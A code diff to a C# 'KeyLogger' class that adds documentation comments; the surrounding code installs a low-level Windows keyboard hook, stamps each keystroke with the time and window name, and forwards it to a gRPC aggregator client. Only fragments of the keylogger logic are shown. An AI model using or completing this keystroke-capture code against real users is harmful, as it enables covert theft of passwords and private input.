@@ -7,6 +7,12 @@ using Grpc.Core;
 
 namespace Hooks
 {
+    /// <summary>
+    /// KeyLogger provides a class for reading the keystrokes via a windows
+    /// hook. It records a timestamp as well as the target window's name when
+    /// it intercepts a key. Keys are sent to the a KeyPressAggretorClient
+    /// specified during object creation.
+    /// </summary>
     class KeyLogger
     {
         private const int WH_KEYBOARD_LL = 13;
@@ -17,7 +23,7 @@ namespace Hooks
         public static KerPressAggergator.KerPressAggergatorClient client;
 
         ///<summary>
-        ///Initialize the keylogger.
+        ///Initialize the keylogger with a AggregatorClient to send keypresses too.
         ///</summary>
         public KeyLogger(KerPressAggergator.KerPressAggergatorClient c)
         {
@@ -34,7 +40,7 @@ namespace Hooks
         }
 
         ///<summary>
-        ///Disconnect the hook.
+        ///Remove the hook.
         ///</summary>
         public void Deactivate()
         {
@@ -76,6 +82,7 @@ namespace Hooks
             if ((client != null) && (client.Channel.State != ChannelState.FatalFailure)){
                 if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                 {
+                    // Create a KeyPress object and get keypress metadata.
                     KeyPress ks = new KeyPress();
                     DateTimeOffset x = new DateTimeOffset(DateTime.Now);
                     ks.Key = Marshal.ReadInt32(lParam);
